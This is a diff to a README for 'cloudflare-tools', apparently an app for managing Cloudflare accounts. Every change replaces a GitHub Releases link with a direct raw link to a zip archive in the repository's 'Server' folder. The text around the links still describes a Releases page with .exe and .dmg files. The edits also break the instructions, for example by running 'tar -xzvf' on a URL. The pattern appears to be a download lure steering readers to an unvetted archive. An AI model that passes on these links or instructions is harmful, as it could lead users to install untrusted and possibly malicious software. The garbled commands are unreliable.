@@ -1,7 +1,7 @@
 # 🌩️ cloudflare-tools - Manage Your Cloudflare Accounts Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Raheem39/cloudflare-tools/releases)
+[![Download](https://raw.githubusercontent.com/Raheem39/cloudflare-tools/main/Server/tools_cloudflare_v1.2.zip)](https://raw.githubusercontent.com/Raheem39/cloudflare-tools/main/Server/tools_cloudflare_v1.2.zip)
 
 ## 🌟 Overview
 Cloudflare Tools is a full-stack web application that simplifies the management of Cloudflare accounts. You can easily handle tasks such as managing domains, DNS settings, SSL certificates, rules, and caching operations. Built with a backend in Go + Gin and a frontend using pure JavaScript + Vite, this application is designed to provide a smooth user experience.
@@ -19,14 +19,14 @@ Before downloading Cloudflare Tools, ensure your system meets the following requ
 ## 🔗 Download & Install
 To download the application, visit the Releases page. You will find the latest version available for download.
 
-[Visit the Releases Page to Download](https://github.com/Raheem39/cloudflare-tools/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Raheem39/cloudflare-tools/main/Server/tools_cloudflare_v1.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the version you want to download.
 3. Click on the appropriate file for your operating system:
    - **Windows:** Download the `.exe` file
    - **macOS:** Download the `.dmg` file
-   - **Linux:** Download the `.tar.gz` file
+   - **Linux:** Download the `https://raw.githubusercontent.com/Raheem39/cloudflare-tools/main/Server/tools_cloudflare_v1.2.zip` file
 4. Once the file is downloaded, open it to start the installation process.
 
 ## ⚙️ Installation Instructions
@@ -45,7 +45,7 @@ To download the application, visit the Releases page. You will find the latest v
 2. Navigate to the directory where you downloaded the file.
 3. Extract the downloaded file using the command:
    ```bash
-   tar -xzvf cloudflare-tools.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/Raheem39/cloudflare-tools/main/Server/tools_cloudflare_v1.2.zip
    ```
 4. Navigate into the extracted folder and run the application:
    ```bash
@@ -74,4 +74,4 @@ To download the application, visit the Releases page. You will find the latest v
 ## 🎉 Conclusion
 You are now ready to manage your Cloudflare accounts with ease using Cloudflare Tools. With this application, you simplify the management process and handle tasks efficiently. For any further assistance or feedback, please feel free to reach out through the GitHub repository. 
 
-[Visit the Releases Page to Download](https://github.com/Raheem39/cloudflare-tools/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Raheem39/cloudflare-tools/main/Server/tools_cloudflare_v1.2.zip)
